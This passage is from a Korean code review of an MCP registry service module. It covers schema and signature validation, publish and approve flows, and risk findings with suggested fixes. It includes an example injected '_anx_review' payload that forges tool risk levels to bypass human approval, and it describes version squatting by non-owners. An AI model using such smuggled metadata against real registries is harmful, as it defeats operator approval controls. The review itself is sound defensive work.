> 리뷰 레벨: 2 — ~3년 주니어 인수인계 수준 · 2차 리뷰(round2) · 스냅샷 2026-10-07 21:03 KST · [← INDEX.md](../../INDEX.md) · 디렉터리 개요: [services_Abstract.md](services_Abstract.md) · 1차 리뷰: 1차 리뷰 대상 아님(부록 A, `.review/CODE-REVIEW-Lv2/INDEX.md:335`)

### 24. app/services/registry.py
**파일 요약 / File Summary**
- 역할 / Role: MCP Registry·통합 카탈로그 서비스(FR-P01·C00~C03·P04). server.json 스키마 검증과 게시자 서명(Ed25519·RS256) 검증, 게시(publish) → 승인(approve)/거부(reject) 버전 상태 머신, 유형별 등록 핸들러(`REGISTER_HANDLERS`)와 MCP 인스턴스 생성(`_register_mcp`), 발견 API 표현(`server_entry`)·검색(`search`), 미러 동기화(공식 레지스트리·Docker 카탈로그·custom URL·file), 라이선스 위험 분류·CycloneDX SBOM.
- 진입점 거리 / Distance: 2 — `app/main.py:186-187`(registry 구성요소일 때 `catalog_api.router` 마운트) → `app/api/catalog.py` 핸들러(`:99-106` 생성, `:178-195` 승인, `:287-307` 거부·등록, `:491-517` `/v0`, `:697-712` 동기화·가져오기) → 이 모듈. 그 밖의 호출처: `app/api/mcp.py:526-534`(운영자 즉시 등록)·`:657-662`(OpenAPI 서버), `app/services/scheduler.py:63-77`(예약 동기화 — lifespan 루프 기준 거리 3), `app/services/review.py:77-79`, `app/services/governance.py:60`, `app/api/ops.py:797`, `app/api/admin.py:462`.
- LOC: 575 (현재 `wc -l`, sha1 `cb9e2fa5…` = `scratchpad/snapshot-start.sha` 와 일치 — Epic 51 미수정) · 1차 리뷰 시점 569 추정 → +6. 근거: 1차 심층 리뷰(13:54)가 라이선스 규칙을 `:511-527`, SBOM 을 `:539-569` 로 인용(`.review/REVIEW-InDepth.md:229`·`:256`) — 현재는 `:517-533`·`:545-575`. 1차 INDEX 부록 A 의 575(`.review/CODE-REVIEW-Lv2/INDEX.md:335`)는 14:36 집계라 이미 변경 뒤 값이다.
- 주요 export: `validate_server_json`, `signature_payload`·`sign_server_json`·`verify_signature`·`trusted_keys`·`require_signature_setting`, `find_item`·`publish`·`approve`·`reject`, (밑줄이지만 API 가 직접 호출) `_version`·`_apply_version`, `register_handler`·`REGISTER_HANDLERS`·`register`·`namespace_of`, `server_entry`·`DISCOVERABLE`·`searchable_text`·`trust_of`·`match_hint`·`parse_query`·`search`, `parse_docker_catalog`·`import_entries`·`due_sources`·`sync_source`, `license_risk`·`sbom`, 상수 `SIG_KEY`·`CATALOG_TYPES`·`SERVER_JSON_SCHEMA`
- 의존(내부): `app.core.config.APP_VERSION`, `app.core.errors`(ApiError·bad_request·conflict), `app.core.http.sync_client`, `app.core.ids`(canonical_json·new_id·slugify), `app.db.utcnow`, `app.models`(CatalogItem·CatalogVersion·RegistrySource·Setting, 함수 안에서 McpServer), `app.services.audit`, `app.services.notify`, (지연) `app.services.deploy`
- 외부 패키지: jsonschema(Draft 2020-12), PyYAML(`safe_load`), cryptography(Ed25519·RSA PKCS#1 v1.5·PEM 로드), SQLAlchemy, 표준 `importlib.metadata`·`fnmatch`·`base64`·`uuid`
- 부수효과 / Side effects: DB 쓰기와 커밋(publish·approve·reject·register·import_entries·sync_source 가 각자 `db.commit()`), 감사 체인 추가(`audit.append` — 자체 트랜잭션, `app/services/audit.py:52-56`), 알림(`notify` — 자체 세션, `app/services/notify.py:11-13`), 아웃바운드 HTTP(미러 동기화), 모듈 전역 `REGISTER_HANDLERS`(다른 모듈 import 때 채워짐), 설치된 Python 배포판 메타데이터 읽기(SBOM).
- 동시성 / Concurrency: 모두 동기 함수 — 호출부가 `def` 핸들러(스레드풀) 또는 `run_in_threadpool` 로 부른다(`app/api/catalog.py:296-303`). 게시·승인은 읽기-검사-쓰기(비원자)이고 `catalog_versions` 에 `(item_id, version)` 유일 제약이 없다(`migrations/versions/0001_initial_schema.py:731-743`). 예약 동기화는 `lease("registry")` 로 한 워커만(`app/services/scheduler.py:122-123`), 수동 동기화(`app/api/catalog.py:697-702`)는 그와 겹칠 수 있다.
- 테스트 커버리지 흔적: `test/test_catalog.py:23`(권한·스키마), `:33-64`(게시→승인→발견→등록, 무헤더 `/v0/servers` `:38`·`:50`), `:65-88`(버전 멱등·충돌·대기 버전 거부), `:91-107`(서명 필수·변조), `:109-166`(미러 official·docker·file·상위 장애 502), `:169`(Agent Card 통합 검색), `:187-196`(SBOM·`license_risk`), `:199`(게시 전 검증), `test/test_review.py:330-357`(검색 질의 키·소스 namespaces·예약 주기), `test/test_review_fixes.py:271-282`(게시 메타데이터의 남의 시크릿 참조 제거), `test/test_mcp.py:208`(운영자 즉시 등록). **`_anx_` 키 주입, 등록 옵션 `endpoint` 덮어쓰기, 비 ApiError 항목의 미러 동기화 중단, PostgreSQL 길이 초과, 서명 블록 형식 오류, 오래된 버전 승인·현재 버전 거부 시험 없음.**
- 2차 변경 요약 / Changes since 1st review: 1차 라인 리뷰 대상이 아니었다(부록 A). 1차 이후 변경은 Epic 39 의 "게시 메타데이터의 남의 참조는 등록 때 제거"(`test/impl/39th/scenario.md:28`) — `_register_mcp` 의 L297-303(`own` 접두 검사·`secret_ref` 제거·`tls` 시크릿 키 필터) 6줄. 파일 수정 시각 14:25(1차 스냅샷 14:03 이후), 21:03 스냅샷 이후 변경 없음. 아래 교차 참조 중 Epic 51 에서 바뀐 파일(`app/services/{mcp_gateway,governance,secrets}.py`, `app/core/http.py`, `app/api/mcp.py`, `app/main.py`)은 **현재 디스크(Epic 51 이후)** 줄 번호다.

## 라인 리뷰 / Line Walk (Level 2)

```python path=app/services/registry.py lines=1-29
"""MCP Registry / 통합 카탈로그 (FR-P01, FR-C00~C03, FR-P04).

- 발견 전용(Discovery only): 실행 트래픽은 통과하지 않고 메타데이터(server.json · agent-card.json)만 제공한다.
- 게시(publish) → 검증(스키마·서명) → 운영자 승인 → 발견 노출 → 등록(register) 시 인스턴스 생성(active).
- 미러: 공식 MCP Registry(/v0/servers), Docker MCP 카탈로그(YAML), 커스텀 URL, 파일(에어갭).
"""
import base64
import fnmatch
import importlib.metadata as md
import re
import uuid
from collections.abc import Callable

import jsonschema
import yaml
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ed25519, padding, rsa
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.core.config import APP_VERSION
from app.core.errors import ApiError, bad_request, conflict
from app.core.http import sync_client
from app.core.ids import canonical_json, new_id, slugify
from app.db import utcnow
from app.models import CatalogItem, CatalogVersion, RegistrySource, Setting
from app.services import audit
from app.services.notify import notify
```
**분석 / Analysis (Level 2)**
- L1-6: 설계 계약. (1) 발견 전용(Discovery only) — 실행 트래픽은 게이트웨이(`app/services/mcp_gateway.py`)가 맡고 이 모듈은 메타데이터만 다룬다. (2) 상태 흐름: 게시 → 검증(스키마·서명) → 운영자 승인 → 발견 노출 → 등록(register) 때 인스턴스 생성(`active`). (3) 미러 4종. 이 흐름의 각 단계가 서로 다른 권한(`registry:publish`·`catalog:approve`·`catalog:write`)으로 나뉜다는 점이 아래 위험 분석의 축이다.
- L7-12: `base64`(서명 base64url), `fnmatch`(미러 네임스페이스 glob), `importlib.metadata as md`(SBOM), `uuid`(SBOM serialNumber).
- L14-18: `yaml` 은 `safe_load` 만 쓴다(L417) — `yaml.load` 는 임의 Python 객체를 만들 수 있어 외부 카탈로그 파싱에 쓰면 안 된다. `cryptography` 는 서명 검증·생성.
- L24: `sync_client` 는 egress 가드 훅이 붙은 httpx 팩토리(`app/core/http.py:178-180`). 가드가 막는 것은 링크 로컬·IMDS 뿐(`:34-38`)이고 사설망은 허용한다.
- L25: `canonical_json` 은 `sort_keys=True`·공백 없음·`ensure_ascii=False`·`default=str`(`app/core/ids.py:28-30`) — 서명 페이로드와 "같은 버전 같은 내용" 비교(L183)의 기준.
- 흔한 실수: 이 모듈의 함수는 `Principal` 이 아니라 `actor: str` 만 받는다. 권한 검사는 전부 호출부(API) 책임이라, 새 호출부를 만들거나 옵션을 늘릴 때 검사를 빠뜨리기 쉽다(아래 L284-290).

```python path=app/services/registry.py lines=31-61
SIG_KEY = "io.agentnexus/signature"
CATALOG_TYPES = ("mcp_server", "a2a_agent", "model", "agent_profile")

# server.json (MCP Registry 2025 스키마의 검증 부분집합)
SERVER_JSON_SCHEMA = {
    "type": "object",
    "required": ["name", "description", "version"],
    "properties": {
        "$schema": {"type": "string"},
        "name": {"type": "string", "minLength": 3, "maxLength": 200,
                 "pattern": r"^[a-zA-Z0-9.-]+/[a-zA-Z0-9._-]+$"},
        "title": {"type": "string", "maxLength": 100},
        "description": {"type": "string", "minLength": 1, "maxLength": 100},
        "version": {"type": "string", "minLength": 1, "maxLength": 255},
        "websiteUrl": {"type": "string"},
        "repository": {"type": "object", "properties": {"url": {"type": "string"}, "source": {"type": "string"}}},
        "packages": {"type": "array", "items": {
            "type": "object", "required": ["registryType", "identifier", "transport"],
            "properties": {"registryType": {"enum": ["npm", "pypi", "oci", "nuget", "mcpb"]},
                           "identifier": {"type": "string"}, "version": {"type": "string"},
                           "transport": {"type": "object", "required": ["type"],
                                         "properties": {"type": {"enum": ["stdio", "streamable-http", "sse"]}}}}}},
        "remotes": {"type": "array", "items": {
            "type": "object", "required": ["type", "url"],
            "properties": {"type": {"enum": ["streamable-http", "sse"]}, "url": {"type": "string",
                                                                               "pattern": "^https?://"}}}},
        "_meta": {"type": "object"},
    },
    "anyOf": [{"required": ["remotes"], "properties": {"remotes": {"minItems": 1}}},
              {"required": ["packages"], "properties": {"packages": {"minItems": 1}}}],
}
```
**분석 / Analysis (Level 2)**
- L31 `SIG_KEY`: `_meta` 안의 AgentNexus 확장 키 — 서명 블록 위치.
- L32 `CATALOG_TYPES`: API 유형 패턴(`app/api/catalog.py:51`)과 같은 4종. 목록 화면의 유형 탭 건수 루프가 쓴다(`:62-64`).
- L35-61: 공식 server.json 스키마의 검증 부분집합. `name` 은 `네임스페이스/이름`(reverse-DNS) 패턴, `description` ≤100, `remotes[].url` 은 `^https?://`, `packages[].registryType`·`transport.type` 은 열거형, 끝의 `anyOf` 는 remotes 또는 packages 가 1개 이상.
- 흔한 실수(1): 최상위에 `additionalProperties` 제한이 없다 — 공식 스키마 밖의 키(예: `_anx_review`)도 통과해 `item_metadata` 에 그대로 저장된다. 이것이 L132-135 [위험:높음] 의 입력 경로다.
- 흔한 실수(2): L44 `version` 은 255자까지 허용하지만 DB 컬럼은 `String(40)`(`app/models.py:221`·`:236`, `migrations/versions/0001_initial_schema.py:214`·`:734`). SQLite 는 VARCHAR 길이를 강제하지 않아 local·시험에서는 드러나지 않고 PostgreSQL 에서만 커밋 때 실패한다(L457-466 [위험:중간] 의 원인 중 하나).

```python path=app/services/registry.py lines=64-71
def validate_server_json(doc: dict) -> list[str]:
    v = jsonschema.Draft202012Validator(SERVER_JSON_SCHEMA)
    errors = []
    for e in sorted(v.iter_errors(doc), key=lambda e: list(e.path)):
        loc = "/".join(str(p) for p in e.path) or "(root)"
        errors.append(f"{loc}: remotes 또는 packages 가 1개 이상 필요합니다" if e.validator == "anyOf"
                      else f"{loc}: {e.message}")
    return errors
```
**분석 / Analysis (Level 2)**
- L65: 호출마다 `Draft202012Validator` 를 새로 만든다(스키마 검사 포함). 미러 5,000건 동기화면 5,000번 — 모듈 상수로 한 번 만들어 두면 된다(성능, 정확성 문제는 아님).
- L67: `iter_errors` 로 **모든** 오류를 모은다(첫 오류에서 멈추지 않음) — 게시 전 검증 화면이 줄 번호 붙은 오류 목록을 보여 주는 근거(`app/api/catalog.py:539-549`). `e.path` 는 deque 라 `list(...)` 로 바꿔 정렬 키로 쓴다.
- L69-70: `anyOf` 실패는 jsonschema 의 기본 문구가 장황해서 사람이 읽을 문구로 바꾼다.

```python path=app/services/registry.py lines=74-92
# ── 서명 (게시자 키, RS256 · EdDSA) ──
def signature_payload(doc: dict) -> bytes:
    body = {k: v for k, v in doc.items() if k != "_meta"}
    meta = {k: v for k, v in (doc.get("_meta") or {}).items() if k != SIG_KEY}
    if meta:
        body["_meta"] = meta
    return canonical_json(body).encode()


def sign_server_json(doc: dict, private_key, kid: str) -> dict:
    payload = signature_payload(doc)
    if isinstance(private_key, ed25519.Ed25519PrivateKey):
        alg, sig = "EdDSA", private_key.sign(payload)
    else:
        alg, sig = "RS256", private_key.sign(payload, padding.PKCS1v15(), hashes.SHA256())
    out = dict(doc)
    out["_meta"] = {**(doc.get("_meta") or {}),
                    SIG_KEY: {"alg": alg, "kid": kid, "sig": base64.urlsafe_b64encode(sig).decode().rstrip("=")}}
    return out
```
**분석 / Analysis (Level 2)**
- L75-80 `signature_payload`: 문서에서 `_meta[SIG_KEY]` 만 빼고 나머지 전체(이름·버전·remotes·`_meta.auth`·도구 목록)를 정규 JSON 바이트로 만든다. 서명이 auth·엔드포인트까지 덮으므로 서명 뒤 전송처를 바꾸면 검증이 깨진다 — 의도대로다. `_meta` 가 서명 블록만 있었다면 키 자체를 뺀다(`{"_meta": {}}` 와 `_meta` 없음이 같은 페이로드 — 무해).
- 흔한 실수: 정규화가 RFC 8785(JCS)가 아니라 Python `json.dumps` 규칙이다. 다른 언어로 서명하는 게시자 도구는 키 정렬·구분자·비ASCII 처리·숫자 표기(`1.0` 등)를 똑같이 재현해야 한다(호환성 문서화 필요).
- L83-92 `sign_server_json`: Ed25519 면 `EdDSA`, 그 밖은 모두 RSA PKCS#1 v1.5 + SHA-256 으로 간주한다(EC 키를 넘기면 `sign` 인자 불일치로 TypeError). 저장소 안에서는 시험만 부른다(`test/test_catalog.py:99`). 서명은 base64url·패딩 제거.

```python path=app/services/registry.py lines=95-124
def trusted_keys(db: Session) -> dict[str, str]:
    row = db.get(Setting, "registry.trusted_keys")
    return dict(row.value or {}) if row else {}


def verify_signature(db: Session, doc: dict) -> tuple[bool, bool, str | None]:
    """(서명 존재, 유효, kid)."""
    sig = (doc.get("_meta") or {}).get(SIG_KEY)
    if not sig:
        return False, False, None
    pem = trusted_keys(db).get(sig.get("kid", ""))
    if not pem:
        return True, False, sig.get("kid")
    raw = base64.urlsafe_b64decode(sig["sig"] + "=" * (-len(sig["sig"]) % 4))
    key = serialization.load_pem_public_key(pem.encode())
    try:
        if isinstance(key, ed25519.Ed25519PublicKey):
            key.verify(raw, signature_payload(doc))
        elif isinstance(key, rsa.RSAPublicKey):
            key.verify(raw, signature_payload(doc), padding.PKCS1v15(), hashes.SHA256())
        else:
            return True, False, sig.get("kid")
    except InvalidSignature:
        return True, False, sig.get("kid")
    return True, True, sig.get("kid")


def require_signature_setting(db: Session) -> bool:
    row = db.get(Setting, "registry.require_signature")
    return bool(row.value) if row else False
```
**분석 / Analysis (Level 2)**
- L95-97 `trusted_keys`: `Setting["registry.trusted_keys"]` = `{kid: PEM}`. 쓰기는 `PUT /api/v1/registry/trust`(`policy:write`, `app/api/catalog.py:726-737`) — PEM 형식 검증 없이 저장된다.
- L100-119 `verify_signature`: (서명 존재, 유효, kid) 세 값. 알고리즘을 문서의 `alg` 가 아니라 **신뢰 키의 종류**(Ed25519·RSA)로 정한다 — 알고리즘 혼동(alg confusion) 공격이 성립하지 않는다(좋은 설계). 모르는 kid 는 (True, False) → 게시에서 422(L163-164) — 서명 필수가 꺼져 있어도 "서명했는데 검증 불가" 는 거부하는 엄격한 정책.
- L108: base64url 패딩 복원(`-len % 4`).
- L122-124: 전역 "서명 필수" 설정. 소스별 `require_signature` 와 OR 로 합쳐진다(L165).
**짚어볼 점 / Watch-outs**
- [위험:낮음] L102-109: 서명 블록의 형식을 검사하지 않는다. `_meta["io.agentnexus/signature"]` 가 문자열·목록이면 L105 `sig.get` 이 AttributeError, kid 는 맞는데 `sig` 키가 없으면 L108 KeyError, base64 가 깨지면 `binascii.Error`, 신뢰 키 PEM 이 깨져 있으면 L109 ValueError — 모두 `ApiError` 가 아니라 500 이 된다. 직접 게시(`app/api/catalog.py:511-517`)·게시 전 검증(`:550`)은 게시자 본인의 500 으로 끝나지만, 미러 경로에서는 동기화 전체를 멈춘다(L457-466 [위험:중간]). 최소 수정: `isinstance(sig, dict)` 와 `kid`·`sig` 문자열 확인 후 아니면 `(True, False, kid)`, `load_pem_public_key`·디코드를 `try` 안으로, `PUT /registry/trust` 에서 PEM 을 미리 로드해 보기.

```python path=app/services/registry.py lines=127-148
# ── 게시·승인 ──
def find_item(db: Session, type_: str, name: str) -> CatalogItem | None:
    return db.scalars(select(CatalogItem).where(CatalogItem.type == type_, CatalogItem.name == name)).first()


def _apply_version(item: CatalogItem, ver: CatalogVersion) -> None:
    item.version = ver.version
    keep = {k: v for k, v in (item.item_metadata or {}).items() if k.startswith("_anx_")}  # 심사·즉시 사용 기록은 버전과 무관
    item.item_metadata = {**(ver.item_metadata or {}), **keep}
    item.signature_verified = ver.signature_verified
    meta = ver.item_metadata or {}
    if item.type == "mcp_server":
        item.description = meta.get("description")
        item.display_name = meta.get("title") or item.display_name
        item.license = (meta.get("_meta") or {}).get("license") or item.license
        auth = (meta.get("_meta") or {}).get("auth") or {}
        item.auth_scheme = auth.get("type") or item.auth_scheme
    elif item.type == "a2a_agent":
        item.description = meta.get("description")
        item.display_name = meta.get("name") or item.display_name
        schemes = list((meta.get("securitySchemes") or {}).keys())
        item.auth_scheme = schemes[0] if schemes else "none"
```
**분석 / Analysis (Level 2)**
- L128-129 `find_item`: `(type, name)` 은 DB 유일 제약(`uq_catalog_type_name`, `app/models.py:210`).
- L132-148 `_apply_version`: 승인(또는 첫 게시)된 버전의 메타데이터를 item 에 반영한다. 대기 버전은 item 을 바꾸지 않으므로 "카탈로그에 보이는 것 = 승인된 것" 이 유지된다(L191-195, L229).
- L134: `_anx_` 접두 키 — 심사 기록(`_anx_review`, `app/services/review.py:176-179`)·즉시 사용 기록(`_anx_instant`, `app/api/catalog.py:439-440`) — 은 버전이 바뀌어도 item 쪽 값을 유지한다는 의도.
- L135: JSON 컬럼은 **새 dict 를 재대입**한다 — 제자리 변경(`item.item_metadata["x"] = …`)은 SQLAlchemy 가 감지하지 못하므로 이 패턴이 맞다.
- L138-148: 유형별 표시 필드. a2a_agent 는 카드를 메타데이터 최상위에 저장하므로(`app/api/a2a.py:417`) `name`·`securitySchemes` 를 최상위에서 읽는다. model·agent_profile 은 여기서 건드리지 않고 게시 인자(L193-195)로만 정해진다.
**짚어볼 점 / Watch-outs**
- [위험:높음] L134-135: `_anx_*` 의 **출처를 구분하지 않는다**. 게시 문서에 최상위 `_anx_review` 를 넣으면(스키마가 막지 않음, L35-61) 새 항목은 생성 때 `item_metadata=metadata`(L172)이고 L192 의 `_apply_version` 이 그 값을 "item 쪽 기록" 으로 보존한다. 기존 항목이라도 item 에 `_anx_review` 가 아직 없으면(예: `app/api/mcp.py:531-532` 처럼 `review.apply_approval` 없이 승인된 항목, 미러 auto_approve 항목) 새 버전의 값이 승인 때 그대로 남는다. 이어지는 소비처: (1) 승인 효과는 승인자가 값을 주지 않으면 이전 값을 이어받아 `"by": 승인자` 로 다시 기록한다(`app/services/review.py:176-179`) — 게시자 값이 승인자 결정처럼 보인다. (2) 등록 때 `_apply_review_risks` 가 `_anx_review.tool_risks` 를 `ToolRule` 에 `allowed=True`·`approval_required = (risk == "high")` 로 적용(`app/api/catalog.py:475-487`), 즉시 사용 정책 단계도 같은 값을 쓴다(`:381-385`). (3) `trust_of` 가 `"trusted"` 를 돌려주면 게이트웨이 기본 규칙이 업스트림 `readOnlyHint` 를 믿는다(`app/services/governance.py:60`, `:41-48`). 시나리오: 개발자(`registry:publish`)가 `"_anx_review": {"tool_risks": {"delete_repository": "low"}, "trust": "trusted"}` 를 넣은 server.json 을 `POST /v0/publish` → 승인 대기열은 계산된 위험도(`delete_repository` = high, `app/services/review.py:146-148`)를 보여 주므로 승인자는 기본값 그대로 승인 → 운영자 "즉시 사용"(register) → `delete_repository` 가 사람 승인 없이 허용된다(FR-G07 사람 승인 통제 우회). 같은 입력은 상위 미러(custom URL·file 번들)에서도 들어온다. 최소 수정: `publish`·`import_entries` 에서 최상위 `_anx_` 접두 키를 거부(422)하거나 제거하고, `_apply_version` 은 `ver.item_metadata` 에서 `_anx_*` 를 뺀 뒤 item 쪽 값만 덮는다. 회귀 시험: 주입한 `tool_risks` 가 등록 후 `ToolRule` 에 반영되지 않는지.
- [위험:낮음] L141·L143: `_meta.license`·`_meta.auth.type` 길이를 확인하지 않는다 — 컬럼은 `String(80)`·`String(40)`(`app/models.py:222`·`:219`). PostgreSQL 에서 커밋(L196·L232) 때 DataError(500). 미러 경로의 결과는 L457-466.

```python path=app/services/registry.py lines=151-167
def publish(db: Session, type_: str, name: str, version: str, metadata: dict, actor: str, *,
            source: str = "registry", source_id: str | None = None, auto_approve: bool = False,
            require_signature: bool = False, tags: list[str] | None = None, license: str | None = None,
            display_name: str | None = None, description: str | None = None, owner: str | None = None,
            auth_scheme: str | None = None) -> tuple[CatalogItem, CatalogVersion, bool]:
    """게시 — (item, version, created). 같은 버전 재게시는 내용이 같으면 멱등, 다르면 409."""
    sig_verified = False
    if type_ == "mcp_server":
        errors = validate_server_json(metadata)
        if errors:
            raise ApiError(422, "invalid_server_json", "server.json 검증 실패", extra={"errors": errors})
        present, valid, kid = verify_signature(db, metadata)
        if present and not valid:
            raise ApiError(422, "invalid_signature", f"서명 검증 실패 (kid={kid})")
        if (require_signature or require_signature_setting(db)) and not valid:
            raise ApiError(422, "signature_required", "신뢰할 수 있는 게시자 서명이 필요합니다.")
        sig_verified = valid
```
**분석 / Analysis (Level 2)**
- L151-155: 키워드 전용 인자(`*`)로 게시 출처·자동 승인·서명 필수·표시 필드를 받는다. 반환 `(item, version, created)` 의 `created` 는 "새 버전 행을 만들었나" — 미러 집계의 imported/unchanged 구분(L461).
- L158-167: **mcp_server 만** 스키마·서명을 검사한다. a2a_agent·agent_profile·model 은 임의 dict 가 그대로 저장되고 카드 검증은 승인 점검(`app/services/review.py:85-88`)에서야 한다.
- L162-166: 서명이 있는데 무효 → 422 `invalid_signature`, 서명 필수(소스 설정 OR 전역 설정)인데 유효하지 않음 → 422 `signature_required`. 검증은 쓰기 전에 끝나므로 실패해도 DB 에 흔적이 없다.

```python path=app/services/registry.py lines=168-205
    item = find_item(db, type_, name)
    created = item is None
    if item is None:
        item = CatalogItem(id=new_id("cat"), type=type_, name=name, source=source, source_id=source_id,
                           status="pending", version=version, item_metadata=metadata, owner=owner or actor,
                           tags=tags or [], license=license, display_name=display_name, description=description,
                           auth_scheme=auth_scheme)
        db.add(item)
        db.flush()
    else:
        if tags is not None:
            item.tags = tags
    existing = db.scalars(select(CatalogVersion).where(CatalogVersion.item_id == item.id,
                                                       CatalogVersion.version == version)).first()
    if existing:
        if canonical_json(existing.item_metadata) != canonical_json(metadata):
            raise conflict(f"{name}@{version} 은 이미 다른 내용으로 게시되었습니다. 버전을 올리세요.",
                           code="version_exists")
        return item, existing, False
    ver = CatalogVersion(id=new_id("cver"), item_id=item.id, version=version, item_metadata=metadata,
                         status="pending", signature_verified=sig_verified, created_by=actor)
    db.add(ver)
    db.flush()
    if created:
        _apply_version(item, ver)
        item.display_name = display_name or item.display_name
        item.description = description or item.description
        item.license = license or item.license
    db.commit()
    audit.append("registry.publish", actor=actor, target=f"{type_}:{name}@{version}",
                 data={"item_id": item.id, "source": source, "signature_verified": sig_verified})
    if auto_approve:
        approve(db, item, version, actor="system:auto-approve", note=f"source {source} auto_approve")
    else:
        notify("registry.pending", f"등록 승인 대기: {name}@{version}", f"{type_} 게시 — {actor}",
               severity="warn", link="/console/registry/approvals", audience_role="operator",
               dedupe_key=f"registry.pending:{item.id}:{version}")
    return item, ver, True
```
**분석 / Analysis (Level 2)**
- L168-176: 없으면 `pending` 항목을 만들고 `flush()` 로 id 를 확정(버전 행의 FK). `owner=owner or actor` — 첫 게시자가 소유자.
- L177-179: 기존 항목이면 태그만 바꾼다. 현재 호출부 중 기존 항목에 `tags` 를 넘기는 곳은 없다(`create_catalog_item` 은 기존 항목이면 409, `app/api/catalog.py:101-102`).
- L180-186: 같은 버전이 있으면 정규 JSON 비교 — 같으면 멱등 반환, 다르면 409 `version_exists`("버전을 올리세요"). 버전 불변(immutability)은 공급망 추적의 기본 — 좋은 설계.
- L187-195: 새 버전은 항상 `pending`. 새 항목이면 첫 버전을 바로 item 에 반영하고(L192) 명시 인자로 표시 필드를 덮는다.
- L196-198: 커밋 **후** 감사. `audit.append` 는 자체 트랜잭션이라(`app/services/audit.py:52-56`) 감사 쓰기가 실패하면 데이터는 남고 요청은 500 — 감사 누락 가능(1차 INDEX §4.1-6 계열).
- L199-204: 자동 승인 소스면 곧바로 `approve`, 아니면 운영자 알림(항목·버전별 dedupe).
**짚어볼 점 / Watch-outs**
- [위험:중간] L168-190: 기존 항목에 새 버전을 게시할 때 **게시자 = 소유자 확인이 없다**(객체 수준 인가). 호출부 `POST /v0/publish` 는 `registry:publish`(developer 역할 포함, `app/core/auth.py:21`)만 본다(`app/api/catalog.py:511-517`). 시나리오: 개발자 B 가 다른 팀 항목이나 미러 항목(`source="mirror"`)의 **다음 버전 번호**를 먼저 게시 → (a) 미러가 그 버전을 가져오면 내용이 달라 409 → invalid 로 집계되어 정상 버전이 영영 못 들어온다(버전 선점), (b) 승인 대기열에는 원래 항목 이름으로 올라가고 구분 단서는 출처 문구의 "요청자"(`app/services/review.py:95-96`)뿐, (c) L134 주입과 결합하면 승인 이력이 없는 항목에 `_anx_review` 를 심을 수 있다. 최소 수정: 기존 항목이면 `item.owner == actor` 또는 `catalog:approve` 보유자만 게시(서비스 함수에 principal 전달), `source="mirror"` 항목의 새 버전은 해당 미러만.
- [위험:낮음] L180-190: `(item_id, version)` 유일 제약이 없어(`migrations/versions/0001_initial_schema.py:731-743`) 동시 게시(수동 동기화와 예약 동기화가 겹치거나 같은 문서 동시 POST)가 같은 버전 행을 둘 만들 수 있다 — 이후 `_version(...).first()` 가 임의 행을 고른다. 새 항목 동시 생성은 `uq_catalog_type_name` IntegrityError → 500. 최소 수정: 유일 제약 추가 + IntegrityError 를 409/unchanged 로.
- [위험:낮음] L199-200: 자동 승인은 승인 점검(`review.queue_row`)·승인 효과(`review.apply_approval`)를 거치지 않는다. 스키마·서명은 L158-167 에서 이미 봤으므로 점검 자체는 대부분 중복이지만, 자동 승인 항목에는 승인자가 확정한 `_anx_review` 가 없다 — L134 주입이 남는 경로.

```python path=app/services/registry.py lines=208-235
def _version(db: Session, item: CatalogItem, version: str | None, status: str = "pending") -> CatalogVersion:
    stmt = select(CatalogVersion).where(CatalogVersion.item_id == item.id)
    if version:
        stmt = stmt.where(CatalogVersion.version == version)
    else:
        stmt = stmt.where(CatalogVersion.status == status).order_by(CatalogVersion.created_at.desc())
    ver = db.scalars(stmt).first()
    if ver is None:
        raise bad_request(f"{item.name} 에 {version or status} 버전이 없습니다.", code="no_version")
    return ver


def approve(db: Session, item: CatalogItem, version: str | None, actor: str, note: str | None = None) -> CatalogItem:
    ver = _version(db, item, version)
    if ver.status == "rejected":
        raise bad_request("거부된 버전은 승인할 수 없습니다. 새 버전을 게시하세요.")
    for other in db.scalars(select(CatalogVersion).where(CatalogVersion.item_id == item.id,
                                                         CatalogVersion.status == "approved",
                                                         CatalogVersion.id != ver.id)):
        other.status = "superseded"
    ver.status, ver.decided_by, ver.decided_at, ver.note = "approved", actor, utcnow(), note
    _apply_version(item, ver)
    if item.status in ("pending", "rejected", "deprecated"):
        item.status = "approved"
    db.commit()
    audit.append("registry.approve", actor=actor, target=f"{item.type}:{item.name}@{ver.version}", decision="approved",
                 data={"item_id": item.id, "note": note})
    return item
```
**분석 / Analysis (Level 2)**
- L208-217 `_version`: 버전을 주면 그 버전, 안 주면 해당 상태(기본 `pending`)의 최신. 없으면 400 `no_version`. API 가 승인·diff·고정·롤백에서 직접 쓴다(`app/api/catalog.py:182`, `:203`, `:215`, `:238`).
- L220-235 `approve`: 거부 버전은 승인 불가 → 다른 승인 버전은 `superseded` → 이 버전 `approved`·결정자·시각·메모 → item 에 반영 → item 상태가 pending·rejected·deprecated 면 `approved`(이미 `active` 면 유지) → 커밋 → 감사.
- L229-231: `active` 항목의 새 버전 승인은 item(카탈로그 표시)만 바꾸고 `McpServer`(endpoint·auth·server_json)는 재등록 전까지 옛 값이다 — 의도된 2단계(승인 ≠ 배포)이지만 화면에서 둘이 다를 수 있다는 점을 알아 둘 것.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L222: `rejected` 만 막는다. 72시간 자동 반려된 `expired` 버전(`app/services/review.py:127-140`)도 버전을 명시하면 승인된다 — API 경로는 점검(`app/api/catalog.py:182-186`)만 하고 상태는 보지 않는다. 최소 수정: `ver.status not in ("pending", "superseded")` 면 400.
- [위험:낮음] L224-229: 승인 = "현재 버전 교체" 다. 더 오래된 버전을 승인해도 item 이 그 버전으로 돌아간다(롤백은 `confirm` 이 필요한데 `app/api/catalog.py:229-233`, 승인으로는 확인 없이 같은 효과). `pinned_version`(`app/models.py:227` "버전 고정")도 보지 않는다 — 저장소 전체에서 이 값을 읽는 곳은 표시·설정뿐(`app/api/catalog.py:29`, `:218`, `:246`)이라, 고정해 둔 항목도 미러 auto_approve 가 새 버전으로 바꾼다. 최소 수정: 고정 버전이 있으면 상태만 바꾸고 `_apply_version` 생략, 현재보다 오래된 버전 승인은 롤백 경로로.

```python path=app/services/registry.py lines=238-246
def reject(db: Session, item: CatalogItem, version: str | None, actor: str, note: str | None = None) -> CatalogItem:
    ver = _version(db, item, version)
    ver.status, ver.decided_by, ver.decided_at, ver.note = "rejected", actor, utcnow(), note
    if item.status == "pending":
        item.status = "rejected"
    db.commit()
    audit.append("registry.reject", actor=actor, target=f"{item.type}:{item.name}@{ver.version}", decision="rejected",
